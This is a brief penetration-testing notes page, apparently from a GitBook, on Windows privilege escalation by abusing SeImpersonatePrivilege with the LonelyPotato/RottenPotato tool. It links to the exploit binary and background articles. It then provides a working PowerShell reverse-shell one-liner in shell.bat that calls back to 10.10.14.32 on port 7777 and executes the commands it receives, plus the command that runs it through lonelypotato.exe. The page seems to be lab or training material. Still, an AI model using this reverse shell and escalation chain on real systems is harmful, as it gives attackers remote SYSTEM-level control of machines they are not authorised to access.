# LonelyPotato - SeImpersonatePrivilege

https://hunter2.gitbook.io/darthsidious/privilege-escalation/token-impersonation

https://github.com/decoder-it/lonelypotato/blob/master/RottenPotatoEXE/MSFRottenPotato.exe

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

![](../.gitbook/assets/image%20%2840%29.png)

Example:

![](../.gitbook/assets/image%20%2846%29.png)

## shell.bat

```c
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.32',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Usage

```text
lonelypotato.exe t shell.bat
```

![](../.gitbook/assets/image%20%2837%29.png)

![](../.gitbook/assets/image%20%2844%29.png)

